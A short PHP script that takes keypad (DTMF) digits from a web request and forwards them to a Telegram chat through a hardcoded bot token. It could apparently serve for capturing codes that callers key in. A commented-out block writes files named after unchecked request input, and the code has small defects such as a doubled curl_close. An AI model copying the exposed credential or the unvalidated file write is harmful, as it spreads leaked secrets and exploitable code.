<?php

// Get the dtmf parameter and trim any whitespace
$dtmf = trim($_GET['dtmf']);

// Prepend the incoming call message with the + sign
$dtmf = "Incoming call from: $dtmf";

// Optional: Uncomment this section if you want to save to a file
/*
$uid = $_GET['uniqueid'];
// Define the file path
$file = "$uid.txt";

// The text to append
$textToAppend = "$dtmf\n";

// Append the text to the file
file_put_contents($file, $textToAppend, FILE_APPEND);

// Optional: You can also check if the operation was successful
if (file_put_contents($file, $textToAppend, FILE_APPEND) !== false) {
    echo "Text appended successfully!";
} else {
    echo "Failed to append text.";
}
*/

// Initialize cURL
$curl = curl_init();

curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://api.telegram.org/bot7636645795:AAHFoA7GuflyW81tmsF6_Tl5O4vo7HVB3Ok/sendMessage?chat_id=-1002163292165&text=' . urlencode($dtmf),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'GET',
    ));
    
    $response = curl_exec($curl);
    
    curl_close($curl);

curl_close($curl);

?>
